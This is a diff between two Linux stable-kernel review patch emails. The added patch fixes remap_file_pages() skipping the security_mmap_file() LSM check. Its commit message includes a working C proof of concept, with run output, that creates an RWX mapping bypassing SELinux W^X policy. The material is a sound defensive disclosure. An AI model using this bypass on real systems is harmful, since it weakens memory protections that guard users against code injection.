@@ -1,38 +1,39 @@
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 321E821CFEA;
-	Thu, 12 Dec 2024 16:38:19 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8FEFC21CFEA;
+	Thu, 12 Dec 2024 16:38:22 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1734021499; cv=none; b=C0MQca2z6ZUwuA1CSXqepM7+TOp234JqasZKYa2BbQYQdgaDdz5j8g96wxd4bK8arb0mjtsjkQxg8+vLWIoUYQEqcKd7RIZpJZZ9LqqVuOvqLePaASkenQylXdK9N9ScOC7hJsFze4B79NLAvVG3vUoOJsu5WJLtusP4FJPOs8A=
+	t=1734021502; cv=none; b=DfCmapdEaCSsdm8+dqd2aWnnpnmohKsX5RfpwoJmCSHGM9Pfb+sIjbePWEIPI2HsGCBTbYmDK+RR05NmiIAPr1+vZLg/xDL4eEnGGPu+naANjiPzRif6v9ygHZ2EMA3c5L1n7GWErFNVn1CLHtKMMCdHiU+os6AgE2E8uAsKmJw=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1734021499; c=relaxed/simple;
-	bh=jBdWgKYg6fNYUqYfqgRB6F2031xlftRcqt9wretRCY0=;
+	s=arc-20240116; t=1734021502; c=relaxed/simple;
+	bh=kpCBODGK5NOEfxCYAsK8OCCGqPOHKGJHbrL8AmgD0kk=;
 	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=csDNJO10t+VPgdEK55LfmbEzLh1EuyBFqnEx5NU7pp+hBA4HrcSaEpjOUOtztQSopIF1Ka3WVdOcnqzfSzQEbyMqWVVWGye4SZEh4akd0uFHNTuttg9JFp4hfIdq32pmUhRE+Q6voJNxkIJcS87cZhxF16/gpUat02ZfYX7dOzY=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=zKrQoIue; arc=none smtp.client-ip=10.30.226.201
+	 MIME-Version; b=NtMUZBFNA4a56dRA7qt3i+YLhY088qu2/GsCAa/00kQDmsgChXkODzsmYZScVMUqYupiqVUB1gdfYbgrhdFYpMZnKDtRnBxtmYgSp5ADd6UNOvLE37gPMWDrkdlg+7vDywhfV8fvP6C1DFYcO4PxzZWiImKjVSt1j6Z9sI5xhL8=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=uTrnCBpp; arc=none smtp.client-ip=10.30.226.201
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="zKrQoIue"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 95C0DC4CECE;
-	Thu, 12 Dec 2024 16:38:18 +0000 (UTC)
+	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="uTrnCBpp"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id E4F6CC4CECE;
+	Thu, 12 Dec 2024 16:38:21 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1734021499;
-	bh=jBdWgKYg6fNYUqYfqgRB6F2031xlftRcqt9wretRCY0=;
+	s=korg; t=1734021502;
+	bh=kpCBODGK5NOEfxCYAsK8OCCGqPOHKGJHbrL8AmgD0kk=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=zKrQoIue4NFtzRzubrtwQBY0X4E+CZNhanlVltNpraEA+K7G9wY/9AuWZBkpTBqLx
-	 J7DxYKOCfDRevhPtRwARe9AKrPXeXl4zu9YnM2Tcx8ExObtkV2X7IN2xb17nH9qK4p
-	 SrXXD5KSGulUYWq9lhdd0xz4vayQ834UtZBH2J50=
+	b=uTrnCBpp7cTZigDL/kV11/aHJvL3A2tGrZ07PDcp9Hsdi5vVe1vwhaYZLWx/rw3VU
+	 7g+i5cVZu6+6Mk6KQ0/UK7dYXv1XJxjhEWsuTKKt5BR+zu2tAC6b6ripK1ig73Iznf
+	 ZJPwMWx1Me5Tij47d+gXP/iO0Dh5GrWHmmu3CpbI=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Cezary Rojewski <cezary.rojewski@intel.com>,
-	=?UTF-8?q?Amadeusz=20S=C5=82awi=C5=84ski?= <amadeuszx.slawinski@linux.intel.com>,
-	Mark Brown <broonie@kernel.org>
-Subject: [PATCH 6.1 755/772] ASoC: Intel: avs: Fix return status of avs_pcm_hw_constraints_init()
-Date: Thu, 12 Dec 2024 16:01:40 +0100
-Message-ID: <20241212144421.132445780@linuxfoundation.org>
+	Shu Han <ebpqwerty472123@gmail.com>,
+	Stephen Smalley <stephen.smalley.work@gmail.com>,
+	Paul Moore <paul@paul-moore.com>,
+	Bin Lan <bin.lan.cn@windriver.com>
+Subject: [PATCH 6.1 756/772] mm: call the security_mmap_file() LSM hook in remap_file_pages()
+Date: Thu, 12 Dec 2024 16:01:41 +0100
+Message-ID: <20241212144421.170816057@linuxfoundation.org>
 X-Mailer: git-send-email 2.47.1
 In-Reply-To: <20241212144349.797589255@linuxfoundation.org>
 References: <20241212144349.797589255@linuxfoundation.org>
@@ -45,51 +46,85 @@ List-Id: <patches.lists.linux.dev>
 List-Subscribe: <mailto:patches+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:patches+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
 
 6.1-stable review patch.  If anyone has any objections, please let me know.
 
 ------------------
 
-From: Amadeusz Sławiński <amadeuszx.slawinski@linux.intel.com>
+From: Shu Han <ebpqwerty472123@gmail.com>
 
-commit a0aae96be5ffc5b456ca07bfe1385b721c20e184 upstream.
+commit ea7e2d5e49c05e5db1922387b09ca74aa40f46e2 upstream.
 
-Check for return code from avs_pcm_hw_constraints_init() in
-avs_dai_fe_startup() only checks if value is different from 0. Currently
-function can return positive value, change it to return 0 on success.
+The remap_file_pages syscall handler calls do_mmap() directly, which
+doesn't contain the LSM security check. And if the process has called
+personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for
+RW pages, this will actually result in remapping the pages to RWX,
+bypassing a W^X policy enforced by SELinux.
 
-Reviewed-by: Cezary Rojewski <cezary.rojewski@intel.com>
-Signed-off-by: Amadeusz Sławiński <amadeuszx.slawinski@linux.intel.com>
-I've observed KASAN on our setups and while patch itself is correct
-regardless. Problem seems to be caused by recent changes to rates, as
-this started happening after recent patchsets and doesn't reproduce with
-those reverted
-https://lore.kernel.org/linux-sound/20240905-alsa-12-24-128-v1-0-8371948d3921@baylibre.com/
-https://lore.kernel.org/linux-sound/20240911135756.24434-1-tiwai@suse.de/
-I've tested using Mark tree, where they are both applied and for some
-reason snd_pcm_hw_constraint_minmax() started returning positive value,
-while previously it returned 0. I'm bit worried if it signals some
-potential deeper problem regarding constraints with above changes.
+So we should check prot by security_mmap_file LSM hook in the
+remap_file_pages syscall handler before do_mmap() is called. Otherwise, it
+potentially permits an attacker to bypass a W^X policy enforced by
+SELinux.
 
-Link: https://patch.msgid.link/20241010112008.545526-1-amadeuszx.slawinski@linux.intel.com
-Signed-off-by: Mark Brown <broonie@kernel.org>
+The bypass is similar to CVE-2016-10044, which bypass the same thing via
+AIO and can be found in [1].
+
+The PoC:
+
+$ cat > test.c
+
+int main(void) {
+	size_t pagesz = sysconf(_SC_PAGE_SIZE);
+	int mfd = syscall(SYS_memfd_create, "test", 0);
+	const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,
+		MAP_SHARED, mfd, 0);
+	unsigned int old = syscall(SYS_personality, 0xffffffff);
+	syscall(SYS_personality, READ_IMPLIES_EXEC | old);
+	syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
+	syscall(SYS_personality, old);
+	// show the RWX page exists even if W^X policy is enforced
+	int fd = open("/proc/self/maps", O_RDONLY);
+	unsigned char buf2[1024];
+	while (1) {
+		int ret = read(fd, buf2, 1024);
+		if (ret <= 0) break;
+		write(1, buf2, ret);
+	}
+	close(fd);
+}
+
+$ gcc test.c -o test
+$ ./test | grep rwx
+7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)
+
+Link: https://project-zero.issues.chromium.org/issues/42452389 [1]
+Cc: stable@vger.kernel.org
+Signed-off-by: Shu Han <ebpqwerty472123@gmail.com>
+Acked-by: Stephen Smalley <stephen.smalley.work@gmail.com>
+[PM: subject line tweaks]
+Signed-off-by: Paul Moore <paul@paul-moore.com>
+[ Resolve merge conflict in mm/mmap.c. ]
+Signed-off-by: Bin Lan <bin.lan.cn@windriver.com>
 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- sound/soc/intel/avs/pcm.c |    2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
+ mm/mmap.c |    4 ++++
+ 1 file changed, 4 insertions(+)
 
---- a/sound/soc/intel/avs/pcm.c
-+++ b/sound/soc/intel/avs/pcm.c
-@@ -540,7 +540,7 @@ static int avs_dai_fe_hw_free(struct snd
- 	if (ret < 0)
- 		dev_dbg(dai->dev, "Failed to free pages!\n");
+--- a/mm/mmap.c
++++ b/mm/mmap.c
+@@ -3021,8 +3021,12 @@ SYSCALL_DEFINE5(remap_file_pages, unsign
+ 		flags |= MAP_LOCKED;
  
--	return ret;
-+	return 0;
- }
- 
- static int avs_dai_fe_prepare(struct snd_pcm_substream *substream, struct snd_soc_dai *dai)
+ 	file = get_file(vma->vm_file);
++	ret = security_mmap_file(vma->vm_file, prot, flags);
++	if (ret)
++		goto out_fput;
+ 	ret = do_mmap(vma->vm_file, start, size,
+ 			prot, flags, pgoff, &populate, NULL);
++out_fput:
+ 	fput(file);
+ out:
+ 	mmap_write_unlock(mm);
 
 
